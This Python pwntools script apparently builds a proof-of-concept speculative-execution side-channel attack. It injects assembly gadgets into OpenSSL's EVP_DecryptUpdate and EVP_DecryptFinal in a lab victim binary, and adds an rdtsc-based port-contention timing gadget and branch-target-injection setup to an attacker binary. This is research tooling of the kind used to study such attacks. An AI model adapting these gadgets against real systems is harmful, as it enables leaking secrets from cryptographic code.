#!/usr/bin/env python

import os
import sys
from pwn import *

# Insert gadget at symbol
def inject_gadget(elf, gadget, symbol = '', addr = -1):
	if addr == -1:
		addr = elf.symbols[symbol]
	elf.asm(addr, gadget)

def get_addr(bin, symbol):
	file = ELF(bin)

	print file.symbols

def main(args):
	context.arch = 'amd64'
	nop = 'nop;\n'
	div_marker = 'mov r8d, -1; div r8d;\n'

	if(len(args) != 2):
		print ("Usage: %s <a/v>" % os.path.basename(args[0]))
		return 1

	if args[1] == 'v':
		elf = ELF('./victim_base')

# Alternate 1 add gadget
# +0x16b87f	add rdx, 0x40
# +0x16b883	add rsi, rdx
# +0x16b886	add rdi, rdx
# +0x16b889	lea r11, [rip + 0x2e920]
# +0x16b890	movsxd rcx, dword ptr [r11 + rdx*4]
# +0x16b894	add rcx, r11
# +0x16b897	jmp rcx
		add_gadget = """
						add rdx, 0x40;
						add rsi, rdx;
						add rdi, rdx;
						lea r11, QWORD PTR [rip + 0x2e920];
						movsxd rcx, DWORD PTR [r11 + rdx * 4];
						add rcx, r11;
						jmp QWORD PTR [rcx];
					"""
		inject_gadget(elf, add_gadget, symbol = 'EVP_DecryptFinal')

		smother_gadget = """	ELSE:
								mov	   r8d, -1;
								div    r8d;
								add    rax, 1;
								add    rdx, 0x20;
								cmp    QWORD PTR [rbp-0x100],rax;
								je     END;
								test   QWORD PTR [rdx],0x400;
								mov	   r8d, -1;
								div    r8d;
								je     ELSE;
								mov    rdi,QWORD PTR [rbp-0xb0];
								mov    edx,DWORD PTR [rbp-0xf0];
								mov    rax,QWORD PTR [rdi+rax*8];
								test   edx,edx;
								mov    QWORD PTR [rbx+0x50],rax;
								END:
		 		 		 """
		inject_gadget(elf, smother_gadget, symbol = 'EVP_DecryptUpdate')
		elf.save('./victim')

	if args[1] == 'a':
		elf = ELF('./attack_base')

		delay_sequence = '' # '.rept 40; add ebc, eax;'
		timing_sequence = """ 	GADGET:
								rdtsc;
        						shl rdx, 0x20;
        						or rax, rdx;
        						mov r12, rax;
        						.rept 8;
        						btr r9d, r8d;
        						btr r11d, r10d;
        						bts r9d, r8d;
        						bts r11d, r10d
        						.endr;
        						rdtsc;
        						shl rdx, 0x20;
        						or rax, rdx;
        						sub rax, r12;
        						ret;
					      """
		n_nop = 0x1a
		attack_gadget = n_nop * nop + div_marker + timing_sequence
		inject_gadget(elf, attack_gadget, symbol = 'EVP_DecryptUpdate')
		gadget_addr = elf.symbols['EVP_DecryptUpdate'] + n_nop


		jump_sequence = '.rept 0xc; nop; .endr; lea rcx, QWORD PTR [rsp - 0x10]; mov QWORD PTR [rcx], ' + hex(gadget_addr) + '; jmp QWORD PTR [rcx]; ret;'
		inject_gadget(elf, jump_sequence, symbol = 'EVP_DecryptFinal')

		# set_attack_ptr = 'mov rax, rsp; mov QWORD PTR [rax+0x20], ' + hex(gadget_addr) + '; nop;'
		set_attack_ptr = 'mov rax, rsp; mov QWORD PTR [rax+0x20], ' + hex(elf.symbols['EVP_DecryptFinal']) + '; nop;'
		# 0x45aeb is the address of the BTI gadget in the victim
		# 0x45ae2 just before the BTI gadget on the attacker
		# We set the pointer at (rax + 0x20) to the address of the SMoTher gadget
		callq_addr = 0x45bdb
		inject_gadget(elf, set_attack_ptr, addr = callq_addr - 12)

		# The attacker returns immediately after running the attack timing
		post_attack_stuff = 'mov r12d, eax; jmp ' + hex(callq_addr + 0x1d) + '; ENDO: '
		inject_gadget(elf, post_attack_stuff, addr = callq_addr + 3)

		elf.save('./attack')

if __name__ == '__main__':
    exit(main(sys.argv))
